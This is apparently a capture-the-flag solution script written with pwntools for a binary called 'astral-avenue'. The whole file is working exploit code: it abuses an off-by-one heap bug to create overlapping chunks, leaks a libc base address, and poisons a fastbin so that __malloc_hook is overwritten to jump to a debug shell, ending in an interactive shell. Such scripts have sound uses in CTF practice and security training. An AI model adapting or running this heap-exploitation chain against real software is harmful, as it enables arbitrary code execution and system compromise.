from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x4013fe
continue
c
p main_arena
'''.format(**locals())

# Binary filename
exe = './astral-avenue'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
ld = ELF("/tmp/ld-2.23.so")

# Pass in pattern_size, get back EIP/RIP offset
# offset = find_ip(cyclic(500))

# # Start program
io = start()


def create(size, data):
  io.sendlineafter('>', str(1))
  io.sendlineafter('Size: ', str(size))
  io.sendlineafter('Item name: ', data)
 
def delete(idx):
  io.sendlineafter('>', str(2))
  io.sendlineafter('Index: ', str(idx))
 
def printData(idx):
  io.sendlineafter('>', str(3))
  io.sendlineafter('Index: ', str(idx))
  io.recvuntil('Item content: \n')
  ret = io.recvuntil('\n')
  print(ret[:-1])
  return ret[:-1]

create(0xf8, 'A'*0xf8) # chunk_AAA, idx = 0
create(0x68, 'B'*0x68) # chunk_BBB, idx = 1
create(0xf8, 'C'*0xf8) # chunk_CCC, idx = 2
create(0x10, 'D'*0x10) # chunk_DDD, idx = 3


# chunk_AAA will be a valid free chunk (containing libc-addresses in FD/BK)
delete(0)

# leverage off-by-one vuln in chunk_BBB:
# overwrite prev_inuse bit of following chunk (chunk_CCC)
delete(1)
create(0x68, 'B'*0x68) # chunk_BBB, new idx = 0

# set prev_size of following chunk (chunk_CCC) to 0x170
for i in range(0x66, 0x5f, -1):
  delete(0)
  create(i+2, 'B'*i + '\x70\x01') # chunk_BBB, new_idx = 0

# now delete chunk_CCC to trigger consolidation with the fakchunk(0x170)
# after this we have got a big free chunk (0x270) overlapping with chunk_BBB
delete(2)

# create a new chunk (chunk_EEE) within the big free chunk to push
# the libc-addresses (fd/bk) down to chunk_BBB
create(0xf6, 'E'*0xf6) # chunk_EEE, new_idx = 1

# the content of chunk_BBB now contains fd/bk (libc-addresses)
# just print the chunk (idx = 0)
libc_offset = 0x39bb78 # To get this: Leaked value - libc base(i proc map)
libc_leak = printData(0)
t = (8-len(libc_leak))*'\x00'.encode()
libc_leak = unpack(libc_leak + t, 64)
libc_base = libc_leak - libc_offset
log.info('libc_base: ' + hex(libc_base))


# restore the size field (0x70) of chunk_BBB
for i in range(0xfd, 0xf7, -1):
  delete(1)
  create(i+1, 'E'*i + '\x70') # chunk_EEE, new_idx = 1
 
# free chunk_BBB: the address of the chunk is added to the fastbin-list
delete(0)
 
# free chunk_EEE
delete(1)

# create another new chunk (chunk_FFF) within the big free chunk which
# will set the fd of the free'd fastbin chunk_BBB to the value of foo
malloc_hook_offset = 0x39baed
hook = libc_base + malloc_hook_offset
create(0x108, b'F'*0x100 + p64(hook)) # new_idx = 0

# restore the size field (0x70) of the free'd chunk_BBB
for i in range(0xfe, 0xf7, -1):
  delete(0)
  create(i+8, b'F'*i + p64(0x70)) # new_idx = 0

# now recreate chunk_BBB
# -> this will add the address in fd (hook) to the fastbin-list
create(0x68, b'B'*0x68)

# foo = 0xb00bb00b
foo = 0x401276 # Address for debug_shell()
create(0x68, 0x13*b'G'+p64(foo)+0x4d*b'G')

# since __malloc_hook is set now, the next call to malloc will
# call the address stored there (foo)
create(0x20, 'trigger __malloc_hook')

io.interactive()
